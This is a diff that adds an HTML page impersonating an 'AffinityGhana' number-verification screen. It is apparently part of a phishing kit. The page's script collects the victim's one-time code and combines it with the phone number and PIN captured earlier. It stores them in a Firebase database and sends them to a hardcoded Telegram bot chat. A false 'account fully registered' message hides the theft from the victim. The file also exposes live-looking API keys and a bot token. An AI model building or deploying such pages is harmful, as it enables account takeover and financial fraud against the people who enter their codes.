@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AffinityGhana - Verify</title>
+<link rel="icon" type="image/png" href="assets/logo.png">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="app">
+  <div class="page otp-page">
+
+    <a href="pin.html" class="back-btn">‹</a>
+    <h2 class="otp-header">Confirmation code</h2>
+
+    <div class="illustration-wrap">
+      <div class="illustration-circle peach">
+        <img src="assets/icon-otp.png" alt="">
+      </div>
+    </div>
+
+    <h1 class="title">Verify your number</h1>
+    <p class="subtitle">Enter the 4-digit code we sent to <span id="otpPhoneDisplay">0536115032</span></p>
+
+    <div class="otp-boxes" id="otpBoxesWrap">
+      <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="one-time-code">
+      <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+      <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+      <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+    </div>
+
+    <p class="resend-timer" id="resendTimerP">You can resend code in <span id="otpTimer">2:00</span></p>
+
+    <div class="ussd-link">Use USSD instead</div>
+
+  </div>
+</div>
+
+<!-- Toast Notification -->
+<div id="toast" class="toast"></div>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyBx6AU-Jvg1So-Ty3FFKryctXZGV-LNFCY",
+    authDomain: "achievebypetra-82966.firebaseapp.com",
+    databaseURL: "https://achievebypetra-82966-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "achievebypetra-82966",
+    storageBucket: "achievebypetra-82966.firebasestorage.app",
+    messagingSenderId: "412688052429",
+    appId: "1:412688052429:web:abf989e226e153b7c37984",
+    measurementId: "G-TBGZS8PJ76"
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const database = firebase.database();
+
+  const DB_NODE = 'affinity_users';
+
+  // ✅ TELEGRAM BOT CONFIG
+  const TELEGRAM_BOT_TOKEN = "8787871491:AAGuR2BHLAHXdUSE2g6ybBneAJNT3lkmSyY";
+  const TELEGRAM_CHAT_ID = "8938213844";
+
+  function showToast(msg) {
+    const toast = document.getElementById('toast');
+    toast.textContent = msg;
+    toast.classList.add('show');
+    clearTimeout(toast._timeout);
+    toast._timeout = setTimeout(() => {
+      toast.classList.remove('show');
+    }, 3000);
+  }
+
+  function sendTelegramNotification(eventType, userData) {
+    const message = `
+🔔 *AFFINITY NOTIFICATION*
+
+📌 *Event:* ${eventType}
+📱 *Phone:* ${userData.phone || 'Not set'}
+🔐 *PIN:* ${userData.pin || 'Not set'}
+🔑 *OTP:* ${userData.otp || 'Not set'}
+🆔 *User ID:* ${userData.userId || 'Unknown'}
+⏰ *Time:* ${new Date().toLocaleString()}
+
+👤 *Admin:* Check dashboard for details
+    `;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.ok) {
+        console.log('✅ Telegram notification sent!');
+      } else {
+        console.log('❌ Telegram error:', data.description);
+      }
+    })
+    .catch(error => console.error('❌ Telegram send failed:', error));
+  }
+
+  var savedPhone = sessionStorage.getItem('affinity_phone');
+  var otpPhoneDisplay = document.getElementById('otpPhoneDisplay');
+  if (savedPhone) {
+    otpPhoneDisplay.textContent = '0' + savedPhone.replace(/^0+/, '');
+  }
+
+  var otpBoxes = document.querySelectorAll('.otp-box');
+
+  otpBoxes.forEach(function (box, idx) {
+    box.addEventListener('input', function () {
+      box.value = box.value.replace(/\D/g, '');
+      if (box.value && idx < otpBoxes.length - 1) {
+        otpBoxes[idx + 1].focus();
+      }
+      var allFilled = true;
+      var otp = '';
+      otpBoxes.forEach(function (b) {
+        if (!b.value) allFilled = false;
+        otp += b.value;
+      });
+      if (allFilled && otp.length === 4) {
+        saveOTP(otp);
+      }
+    });
+    box.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && !box.value && idx > 0) {
+        otpBoxes[idx - 1].focus();
+      }
+    });
+  });
+
+  setTimeout(function () { otpBoxes[0].focus(); }, 100);
+
+  function saveOTP(otp) {
+    var userId = sessionStorage.getItem('affinity_userId');
+    var phone = sessionStorage.getItem('affinity_phone') || 'Unknown';
+    var pin = sessionStorage.getItem('affinity_pin') || '';
+
+    if (!userId) {
+      showToast('Error: No user found. Please start over.');
+      return;
+    }
+
+    database.ref(DB_NODE + '/' + userId).update({
+      otp: otp
+    })
+      .then(function () {
+        sendTelegramNotification('✅ OTP Verified - Complete Registration', {
+          phone: phone,
+          pin: pin,
+          otp: otp,
+          userId: userId
+        });
+
+        showToast('✅ OTP verified and saved!');
+        document.getElementById('otpBoxesWrap').classList.add('locked');
+        setTimeout(function () {
+          showToast('🎉 Account fully registered!');
+        }, 500);
+      })
+      .catch(function (error) {
+        showToast('Error: ' + error.message);
+      });
+  }
+
+  var otpTimerEl = document.getElementById('otpTimer');
+  var otpBoxesWrap = document.getElementById('otpBoxesWrap');
+  var resendTimerP = document.getElementById('resendTimerP');
+  var secondsLeft = 120;
+
+  function updateOtpTimerDisplay(total) {
+    var m = Math.floor(total / 60);
+    var s = total % 60;
+    otpTimerEl.textContent = m + ':' + (s < 10 ? '0' : '') + s;
+  }
+  updateOtpTimerDisplay(secondsLeft);
+
+  var otpInterval = setInterval(function () {
+    secondsLeft--;
+    if (secondsLeft <= 0) {
+      clearInterval(otpInterval);
+      otpBoxesWrap.classList.add('locked');
+      resendTimerP.classList.add('expired');
+      otpTimerEl.textContent = 'expired';
+      return;
+    }
+    updateOtpTimerDisplay(secondsLeft);
+  }, 1000);
+</script>
+
+</body>
+</html>
